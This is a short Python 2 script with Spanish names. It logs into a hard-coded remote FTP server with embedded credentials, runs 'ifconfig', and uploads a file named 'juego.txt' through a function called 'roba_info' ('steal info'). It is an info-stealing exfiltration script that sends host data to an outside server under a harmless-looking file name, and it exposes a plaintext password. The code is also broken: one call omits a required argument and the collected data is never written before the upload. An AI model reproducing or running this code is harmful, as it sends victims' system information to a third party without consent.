from ftplib import FTP
import os

def placefile(nombre_archivo):
    try:
      filename = nombre_archivo
      ftp.storbinary('STOR '+ filename , open(filename, "rb"))
      ftp.quit()
      print "Finalizado"
    except:
      print 'Error en la subida'

def roba_info(nombre):
  comando = 'ifconfig'
  tubo = os.popen(comando)
  datos = tubo.readlines()
  filename = nombre
  archivo = open(filename, 'w')
  placefile(filename)


try:
  ip = '185.28.20.91'
  ftp = FTP(ip)
  ftp.login(user = 'u183928086', passwd = 'cancer99')
  ftp.cwd('/public_html/')
  roba_info()
except:
  print 'Error de conexion'

nombre = 'juego.txt'
roba_info(nombre)

